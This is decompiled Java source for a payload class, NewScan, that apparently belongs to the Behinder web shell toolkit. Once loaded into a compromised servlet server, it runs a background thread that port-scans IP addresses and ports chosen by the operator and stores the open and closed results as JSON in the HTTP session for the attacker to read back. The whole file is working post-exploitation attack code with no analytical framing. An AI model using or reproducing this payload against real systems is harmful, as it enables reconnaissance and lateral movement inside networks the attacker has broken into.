// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.util.Iterator;
import java.util.Map;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.HashMap;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;
import javax.servlet.http.HttpSession;

public class NewScan implements Runnable
{
    public static String ipList;
    public static String portList;
    public static String taskID;
    private HttpSession Session;
    private ServletRequest Request;
    private ServletResponse response;
    
    public NewScan() {
    }
    
    public NewScan(final HttpSession session) {
        this.Session = session;
    }
    
    public void execute(final ServletRequest request, final ServletResponse response, final HttpSession session) throws Exception {
        new Thread(new NewScan(session)).start();
    }
    
    @Override
    public void run() {
        try {
            final String[] ips = NewScan.ipList.split(",");
            final String[] ports = NewScan.portList.split(",");
            final Map<String, String> sessionObj = new HashMap<String, String>();
            final Map<String, String> scanResult = new HashMap<String, String>();
            sessionObj.put("running", "true");
            for (final String ip : ips) {
                for (final String port : ports) {
                    try {
                        final Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1000);
                        socket.close();
                        scanResult.put(ip + ":" + port, "open");
                    }
                    catch (Exception ex) {
                        scanResult.put(ip + ":" + port, "closed");
                    }
                    sessionObj.put("result", this.buildJson(scanResult, false));
                    this.Session.setAttribute(NewScan.taskID, (Object)sessionObj);
                }
            }
            sessionObj.put("running", "false");
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
}
